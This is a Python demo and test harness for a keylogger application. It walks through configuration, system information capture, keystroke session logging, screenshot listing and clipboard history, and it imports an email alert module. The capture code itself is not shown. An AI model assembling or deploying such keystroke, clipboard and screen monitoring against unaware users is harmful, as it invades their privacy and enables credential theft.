"""
Demo and Testing Script
Demonstrates all features of the keylogger application
"""

import sys
import os
import json
import time
from pathlib import Path

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

from keylogger import Keylogger
from advanced_logger import AdvancedLogger
from system_info import SystemInfoCapture
from screenshot import ScreenshotCapture
from clipboard_tracker import ClipboardTracker
from config_manager import ConfigManager


def print_section(title):
    """Print a formatted section header"""
    print("\n" + "="*70)
    print(f"  {title}")
    print("="*70)


def demo_config_manager():
    """Demonstrate configuration management"""
    print_section("DEMO: Configuration Manager")
    
    config = ConfigManager("config/config.json")
    
    print("\n[1] Loading configuration...")
    if config.config:
        print("    ✓ Configuration loaded successfully")
    
    print("\n[2] Configuration Summary:")
    summary = config.get_config_summary()
    print(f"    - Configuration File: {summary['file']}")
    print(f"    - Enabled Modules: {', '.join(summary['enabled_modules'])}")
    print(f"    - Log Directory: {summary['log_directory']}")
    
    print("\n[3] Getting specific configuration values:")
    print(f"    - Keylogger enabled: {config.is_enabled('keylogger')}")
    print(f"    - Log file: {config.get('keylogger.log_file')}")
    print(f"    - Screenshot interval: {config.get('screenshots.capture_interval')}")
    
    print("\n[4] Validating configuration...")
    if config.validate_config():
        print("    ✓ Configuration is valid")
    else:
        print("    ✗ Configuration validation failed")


def demo_system_info():
    """Demonstrate system information capture"""
    print_section("DEMO: System Information Capture")
    
    sic = SystemInfoCapture()
    
    print("\n[1] Basic System Information:")
    sys_info = sic.get_system_info()
    if sys_info:
        for key, value in sys_info.items():
            print(f"    - {key}: {value}")
    
    print("\n[2] CPU Usage:")
    cpu = sic.get_cpu_usage()
    print(f"    - CPU Usage: {cpu}%")
    
    print("\n[3] Memory Usage:")
    memory = sic.get_memory_usage()
    for key, value in memory.items():
        print(f"    - {key}: {value}")
    
    print("\n[4] Disk Usage:")
    disk = sic.get_disk_usage()
    if disk:
        for device, usage in disk.items():
            print(f"    - {device}:")
            for key, value in usage.items():
                print(f"        {key}: {value}")
    
    print("\n[5] Network Interfaces:")
    net = sic.get_network_interfaces()
    if net:
        for interface, addrs in list(net.items())[:2]:  # Show first 2
            print(f"    - {interface}:")
            for addr in addrs:
                print(f"        {addr['address']} ({addr['family']})")


def demo_advanced_logger():
    """Demonstrate advanced logging"""
    print_section("DEMO: Advanced Logger")
    
    logger = AdvancedLogger("logs")
    
    print("\n[1] Creating session...")
    print(f"    - Session ID: {logger.session_id}")
    print(f"    - Session file: {logger.session_file}")
    
    print("\n[2] Logging sample events...")
    logger.log_event("keystroke", "H")
    logger.log_event("keystroke", "e")
    logger.log_event("keystroke", "l")
    logger.log_event("keystroke", "l")
    logger.log_event("keystroke", "o")
    logger.log_event("system", "CPU: 25%, Memory: 50%")
    print(f"    ✓ Logged 6 events")
    
    print("\n[3] Session Statistics:")
    stats = logger.get_session_stats()
    print(f"    - Total events: {stats['total_events']}")
    print(f"    - Keystrokes: {stats['keystrokes']}")
    print(f"    - Keystroke content: {stats['keystroke_data']}")
    
    print("\n[4] Saving session...")
    if logger.save_session():
        print(f"    ✓ Session saved to {logger.session_file}")
    
    print("\n[5] Exporting to CSV...")
    csv_file = logger.export_to_csv()
    if csv_file:
        print(f"    ✓ Exported to {csv_file}")


def demo_screenshot():
    """Demonstrate screenshot capture"""
    print_section("DEMO: Screenshot Capture")
    
    sc = ScreenshotCapture("screenshots")
    
    print("\n[1] Screenshot Information:")
    info = sc.get_screenshot_info()
    print(f"    - Saved screenshots: {len(info) if info else 0}")
    
    if info:
        print("\n[2] Recent Screenshots:")
        for img in info[-3:]:  # Show last 3
            print(f"    - {img['filename']}")
            print(f"      Size: {img['size']}")
            print(f"      Modified: {img['modified']}")


def demo_clipboard_tracker():
    """Demonstrate clipboard tracking"""
    print_section("DEMO: Clipboard Tracker")
    
    tracker = ClipboardTracker("logs/clipboard.txt")
    
    print("\n[1] Clipboard Tracker Information:")
    print(f"    - Log file: {tracker.log_file}")
    
    history = tracker.get_clipboard_history(limit=5)
    print(f"\n[2] Clipboard History ({len(history)} entries):")
    if history:
        for i, entry in enumerate(history, 1):
            preview = entry[:50] + "..." if len(entry) > 50 else entry
            print(f"    {i}. {preview}")
    else:
        print("    (No clipboard history)")


def test_module_imports():
    """Test if all modules can be imported"""
    print_section("TEST: Module Imports")
    
    modules = [
        "keylogger",
        "advanced_logger",
        "system_info",
        "screenshot",
        "clipboard_tracker",
        "email_alert",
        "config_manager"
    ]
    
    print("\n[1] Attempting to import modules:")
    failed = []
    
    for module in modules:
        try:
            __import__(module)
            print(f"    ✓ {module} imported successfully")
        except Exception as e:
            print(f"    ✗ {module} failed to import: {e}")
            failed.append(module)
    
    if failed:
        print(f"\n[!] Failed to import: {', '.join(failed)}")
        print("    Install missing dependencies with: pip install -r requirements.txt")
    else:
        print("\n    ✓ All modules imported successfully")


def test_file_permissions():
    """Test if necessary directories and files exist"""
    print_section("TEST: File Structure and Permissions")
    
    directories = [
        "logs",
        "screenshots",
        "config"
    ]
    
    files = [
        "config/config.json",
        "main.py"
    ]
    
    print("\n[1] Checking directories:")
    for directory in directories:
        if os.path.isdir(directory):
            print(f"    ✓ {directory}/ exists")
            # Try to write a test file
            try:
                test_file = os.path.join(directory, ".test")
                with open(test_file, 'w') as f:
                    f.write("test")
                os.remove(test_file)
                print(f"      ✓ Write permission OK")
            except Exception as e:
                print(f"      ✗ Write permission issue: {e}")
        else:
            print(f"    ✗ {directory}/ missing")
    
    print("\n[2] Checking files:")
    for file in files:
        if os.path.isfile(file):
            print(f"    ✓ {file} exists")
        else:
            print(f"    ✗ {file} missing")


def test_disk_space():
    """Test available disk space"""
    print_section("TEST: Disk Space")
    
    import shutil
    
    print("\n[1] Available Disk Space:")
    try:
        total, used, free = shutil.disk_usage("/")
        print(f"    - Total: {total / (1024**3):.2f} GB")
        print(f"    - Used: {used / (1024**3):.2f} GB")
        print(f"    - Free: {free / (1024**3):.2f} GB")
        
        free_gb = free / (1024**3)
        if free_gb > 1:
            print(f"    ✓ Sufficient disk space")
        else:
            print(f"    [!] Low disk space warning")
    except Exception as e:
        print(f"    ✗ Error checking disk space: {e}")


def run_interactive_demo():
    """Run interactive demo menu"""
    print_section("Advanced Keylogger Application - Demo & Testing")
    
    while True:
        print("\n[MENU] Choose a demo or test:")
        print("  1. Configuration Manager Demo")
        print("  2. System Information Demo")
        print("  3. Advanced Logger Demo")
        print("  4. Screenshot Capture Demo")
        print("  5. Clipboard Tracker Demo")
        print("  6. Module Import Test")
        print("  7. File Structure Test")
        print("  8. Disk Space Test")
        print("  9. Run All Demos")
        print("  0. Exit")
        
        choice = input("\nEnter your choice (0-9): ").strip()
        
        if choice == "1":
            demo_config_manager()
        elif choice == "2":
            demo_system_info()
        elif choice == "3":
            demo_advanced_logger()
        elif choice == "4":
            demo_screenshot()
        elif choice == "5":
            demo_clipboard_tracker()
        elif choice == "6":
            test_module_imports()
        elif choice == "7":
            test_file_permissions()
        elif choice == "8":
            test_disk_space()
        elif choice == "9":
            print("\nRunning all demos and tests...")
            time.sleep(1)
            demo_config_manager()
            time.sleep(1)
            demo_system_info()
            time.sleep(1)
            demo_advanced_logger()
            time.sleep(1)
            demo_screenshot()
            time.sleep(1)
            demo_clipboard_tracker()
            time.sleep(1)
            test_module_imports()
            time.sleep(1)
            test_file_permissions()
            time.sleep(1)
            test_disk_space()
        elif choice == "0":
            print("\n[*] Exiting demo... Goodbye!")
            break
        else:
            print("\n[!] Invalid choice. Please try again.")
        
        input("\nPress Enter to continue...")


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--auto":
        # Run all demos automatically
        print("Running all demos automatically...\n")
        test_module_imports()
        time.sleep(1)
        test_file_permissions()
        time.sleep(1)
        test_disk_space()
        time.sleep(1)
        demo_config_manager()
        time.sleep(1)
        demo_system_info()
        time.sleep(1)
        demo_advanced_logger()
        time.sleep(1)
        demo_screenshot()
        time.sleep(1)
        demo_clipboard_tracker()
    else:
        # Run interactive menu
        try:
            run_interactive_demo()
        except KeyboardInterrupt:
            print("\n\n[*] Demo interrupted. Goodbye!")
